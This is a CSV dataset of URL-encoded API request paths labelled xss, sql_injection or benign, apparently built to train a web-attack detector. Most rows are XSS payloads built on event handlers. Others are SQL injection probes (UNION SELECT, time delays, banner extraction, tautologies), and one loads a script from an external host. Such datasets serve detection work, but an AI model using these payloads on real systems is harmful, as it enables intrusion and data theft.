text,label
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cnoscript+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fnoscript%3E,xss
/api/v1/feedback?message=%3Cmeter+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/api/v1/comments?text=%3Cbgsound+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fbgsound%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Csummary+onclick%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,xss
/v1/profile?bio=%3Ccode+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fcode%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Cp+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fp%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Coptgroup+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Foptgroup%3E,xss
/api/v2/profile?id=%3Ccontent+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fcontent%3E,xss
/api/v1/comments?text=%3Cp+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fp%3E,xss
/api/v1/login?username=%5Cx27UNION+SELECT&password=pass,sql_injection
/v1/profile?bio=%3Ccommand+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fcommand%3E,xss
/api/v1/reviews?body=%3Chr+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,xss
/api/v1/feedback?message=%3Cs+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fs%3E,xss
/v1/search?q=%3Csvg%3E%3Ctime+onload%3Dalert%281%29%3E%3C%2Ftime%3E,xss
/api/v1/reviews?body=%3Ctime+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftime%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cparam+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fparam%3E,xss
/api/v2/items/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3--?key=API_KEY,sql_injection
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ccol+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fcol%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cs+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fs%3E,xss
/api/v2/users/144976,benign
/api/v1/comments?text=%3Cnextid+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fnextid%3E,xss
/api/v1/reviews?body=%3Ctemplate+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Ftemplate%3E,xss
/v1/profile?bio=%3Ccommand+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcommand%3E,xss
/api/v2/comments/%3Cform+onsubmit%3Dalert%281%29%3E%3Cinput+type%3Dsubmit%3E,xss
/api/v1/cart?user_id=861600&action=view,benign
/v1/search?q=%3Ci+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fi%3E,xss
/v1/products/%C3%A2%E2%82%AC%CB%9C+or+3%3D3+--,sql_injection
/v1/profile?bio=%3Ccolgroup+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fcolgroup%3E%3Cinput+autofocus%3E,xss
/v1/products/%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+banner+FROM+v%24version+WHERE+ROWNUM%3D1%29%29+AND+%27i%27%3D%27i,sql_injection
/api/v2/profile?id=%3Ckeygen+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fkeygen%3E,xss
/api/v1/reviews?body=%3Cnobr+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fnobr%3E,xss
/api/v2/profile?id=%3Cbig+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fbig%3E%3Cinput+autofocus%3E,xss
/api/v1/login?username=select+system_user+from+sysibm.sysdummy1%3B&password=pass,sql_injection
/api/v1/comments?text=%3Cem+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,xss
/api/v1/reviews?body=%3Cimg+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fimg%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Cform+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fform%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Coptgroup+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Foptgroup%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cins+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fins%3E,xss
/api/v1/profile?id=894218,benign
/v1/products/%22%29%29%29%29+waitfor+delay+%270%3A0%3A20%27+--,sql_injection
/v1/search?q=%3Coptgroup+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Foptgroup%3E,xss
/v1/profile?bio=%3Cstyle+onclick%3D%22alert%281%29%22%3Etest%3C%2Fstyle%3E,xss
/api/v1/feedback?message=%3Cbdo+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fbdo%3E,xss
/api/v1/feedback?message=%3Cslot+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fslot%3E,xss
/api/v1/search?q=blue+shirt,benign
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csource+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsource%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ch1+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fh1%3E,xss
/api/v1/feedback?message=%3Csvg%3E%3Cfont+onload%3Dalert%281%29%3E%3C%2Ffont%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cparam+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fparam%3E,xss
/api/v1/reviews?body=%3CIMG+SRC%3D%22+,xss
/v1/search?q=%3Cem+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,xss
/api/v2/comments/%3Ctextarea+onpaste%3Dalert%281%29+autofocus%3E%3C%2Ftextarea%3E,xss
/api/v1/feedback?message=%3C%2Fmath%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v2/comments/%3Ctd+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ftd%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cbdi+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fbdi%3E,xss
/api/v2/items/ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23?key=API_KEY,sql_injection
/api/v1/search?q=827565,benign
/api/v1/search?q=%22+or+1%3D1%C3%A2%E2%82%AC%E2%80%9C,sql_injection
/v1/products/%27+union+select,sql_injection
/api/v1/comments?text=%3Ctd+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftd%3E,xss
/api/v1/feedback?message=%3Cbdo+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fbdo%3E,xss
/api/v1/feedback?message=%3Csummary+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,xss
/v1/profile?bio=%3Cparam+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fparam%3E,xss
/api/v1/reviews?body=%3Cblockquote+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fblockquote%3E,xss
/v1/profile?bio=%3Cnav+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fnav%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ctextarea+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ftextarea%3E,xss
/api/v2/comments/%3Cdl+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fdl%3E,xss
/api/v2/profile?id=%3Cli+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5&status=active,sql_injection
/api/v2/search?q=UNION+ALL+SELECT+NULL&key=API_KEY,sql_injection
/api/v1/reviews?body=%3Clisting+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v1/reviews?body=%3Csvg%3E%3Cs+onload%3Dalert%281%29%3E%3C%2Fs%3E,xss
/v1/search?q=%3Cbasefont+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbasefont%3E,xss
/api/v2/profile?id=%3Carea+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/api/v1/login?username=AND+5650%3DCONVERT%28INT%2C%28SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285650%3D5650%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29&password=pass,sql_injection
/api/v2/comments/%3Cembed+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fembed%3E,xss
/v1/profile?bio=%3Csvg%3E%3Csub+onload%3Dalert%281%29%3E%3C%2Fsub%3E,xss
/api/v1/login?username=ORDER+BY+23--&password=pass,sql_injection
/v1/profile?bio=%3Csvg%3E%3Ckeygen+onload%3Dalert%281%29%3E%3C%2Fkeygen%3E,xss
/prod/users/147039/orders,benign
/v1/products/ORDER+BY+10--,sql_injection
/api/v1/feedback?message=%3Cnobr+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fnobr%3E,xss
/v1/search?q=%3Cdir+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v1/comments?text=%3Cblink+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fblink%3E%3Cinput+autofocus%3E,xss
/v1/orders?customer_id=%27%3Bwaitfor+delay+%270%3A0%3A5%27--&status=active,sql_injection
/api/v1/orders/62060,benign
/v1/profile?bio=%3C%21--+IE+5-9+standards+mode+--%3E,xss
/v1/search?q=%3Cpicture+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/api/v1/feedback?message=%3Cbdi+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fbdi%3E,xss
/api/v1/search?q=hi+or+a%3Da,sql_injection
/api/v1/orders?customer_id=305408,benign
/v1/products/ORDER+BY+24,sql_injection
/api/v1/comments?text=%3Ctextarea+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Ftextarea%3E,xss
/api/v1/feedback?message=%3Cframeset+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fframeset%3E%3Cinput+autofocus%3E,xss
/api/v1/search?q=924604,benign
/api/v1/feedback?message=%3Cbasefont+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fbasefont%3E,xss
/api/v1/login?username=OR+1%3D0--&password=pass,sql_injection
/api/v2/comments/%3Capplet+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fapplet%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cmarquee+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fmarquee%3E,xss
/api/v2/profile?id=%3Cslot+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fslot%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%23,sql_injection
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Crtc+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Frtc%3E,xss
/api/v1/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13,sql_injection
/api/v2/profile?id=%3Csvg%3E%3Canimate+onrepeat%3Dalert%281%29+attributeName%3Dx+dur%3D1s+repeatCount%3D2+%2F%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Ctfoot+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Ftfoot%3E,xss
/v1/search?q=%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg+src+%3Dq+onerror%3Dprompt%288%29%3E,xss
/api/v2/comments/%3Cform+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fform%3E,xss
/v1/search?q=%3Caddress+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Faddress%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cfieldset+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ffieldset%3E,xss
/api/v2/profile?id=%3Ccol+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcol%3E,xss
/api/v2/comments/%3Ctd+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftd%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cnextid+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fnextid%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cbasefont+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fbasefont%3E,xss
/api/v2/items/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%23?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E,xss
/api/v2/profile?id=%3Cprogress+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fprogress%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cstrong+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fstrong%3E,xss
/api/v1/feedback?message=%3Csvg%3E%3Ccenter+onload%3Dalert%281%29%3E%3C%2Fcenter%3E,xss
/api/v1/comments?text=%3Cpre+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmeta+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmeta%3E,xss
/api/v1/comments?text=%3Coutput+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Foutput%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cxmp+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fxmp%3E,xss
/api/v2/profile?id=%3Col+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fol%3E,xss
/api/v1/comments?text=%3Ckeygen+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fkeygen%3E,xss
/api/v1/comments?text=%3Cvideo+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fvideo%3E,xss
/v1/search?q=%3Cfigcaption+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigcaption%3E,xss
/api/v1/feedback?message=%3Cfigcaption+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigcaption%3E,xss
/api/v1/profile?id=886210,benign
/api/v1/comments?text=%3Col+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fol%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cdfn+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fdfn%3E,xss
/api/v1/feedback?message=%3Cblockquote+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fblockquote%3E,xss
/api/v2/comments/%3Cacronym+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Facronym%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cdt+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fdt%3E,xss
/api/v1/comments?text=%3Cbase+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fbase%3E,xss
/v1/profile?bio=%3Cdialog+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdialog%3E,xss
/v1/search?q=%3Caddress+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faddress%3E,xss
/api/v2/comments/%3Cmulticol+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fmulticol%3E,xss
/api/v1/login?username=%29%29%29%29%29%29+waitfor+delay+%270%3A0%3A20%27+--&password=pass,sql_injection
/v1/profile?bio=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E,xss
/repos/acme-inc/api-server/issues,benign
/api/v2/profile?id=%3Clink+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Crtc+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Frtc%3E,xss
/api/v1/comments?text=%3C%3F+%27%3D%22foo%22%3E%3Cx+foo%3D%27%3E%3Cimg+src%3Dx+onerror%3Dalert%283%29%2F%2F%27%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v1/profile?id=96127,benign
/api/v1/reviews?body=%3Cpre+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fpre%3E,xss
/v1/products/%3B+--,sql_injection
/api/v2/search?q=public_key_01&key=809860,benign
/v1/search?q=%3Csvg+id%3Dx+onfocus%3Dalert%281%29%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cnoframes+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fnoframes%3E,xss
/api/v1/feedback?message=%3Cmap+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fmap%3E,xss
/api/v2/profile?id=%3Cstrike+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstrike%3E,xss
/api/v1/comments?text=%3Cul+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ful%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ca+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fa%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cruby+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fruby%3E,xss
/api/v2/comments/%3Cembed+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fembed%3E,xss
/v1/search?q=%3Cfooter+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Ffooter%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ci+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fi%3E,xss
/v1/products/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12--,sql_injection
/api/v2/profile?id=%3C%21--%3E%3CscRipT+src%3D%2F%2F14.rs%3E,xss
/api/v1/feedback?message=%3Cimage+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fimage%3E,xss
/api/v2/users/5752,benign
/v1/profile?bio=%3Chr+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fhr%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cdiv+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdiv%3E,xss
/v1/profile?bio=%3Csup+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fsup%3E%3Cinput+autofocus%3E,xss
/api/v1/namespaces/prod/pods/pod-16235,benign
/v1/search?q=%3Cdiv+id%3D%22137%22%3E%3Csvg%3E,xss
/api/v2/profile?id=%3Clisting+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Flisting%3E,xss
/api/v2/search?q=%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%29%2520%2523&key=API_KEY,sql_injection
/api/v2/profile?id=%3Cx+onxxx%3Dalert%281%29+1%3D%27,xss
/v1/search?q=%3Crt+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frt%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cobject+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fobject%3E,xss
/api/v2/items/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%23?key=API_KEY,sql_injection
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cdfn+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fdfn%3E,xss
/v1/profile?bio=%3Cfont+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Carea+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Farea%3E,xss
/v1/search?q=%3Ch1+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/api/v1/reviews?body=%3Csummary+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,xss
/api/v2/comments/%3Cfigcaption+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ffigcaption%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Ccontent+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fcontent%3E,xss
/v1/search?q=%3Chr+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,xss
/v1/payment_intents/278536/confirm,benign
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Clisting+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Flisting%3E,xss
/api/v2/comments/%3Cvar+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fvar%3E,xss
/api/v2/search?q=938257&key=240928,benign
/api/v2/items/584042?key=clientkey42,benign
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cmain+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fmain%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmenu+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmenu%3E,xss
/api/v1/feedback?message=%5C%27-alert%281%29%2F%2F,xss
/api/v2/items/admin%27+or+1%3D1--?key=API_KEY,sql_injection
/api/v2/profile?id=%3Cnoembed+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,xss
/api/v1/users/146992,benign
/v1/profile?bio=%3Cth+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fth%3E,xss
/v1/search?q=%3Coptgroup+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Foptgroup%3E,xss
/api/v2/items/AK-XY-999?key=APIKEY123,benign
/v1/orders?customer_id=admin%22+or+%221%22%3D%221&status=active,sql_injection
/v1/profile?bio=%3Cvar+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fvar%3E,xss
/compute/v1/projects/proj-7787/zones/europe-west1-b/instances/instance-33973,benign
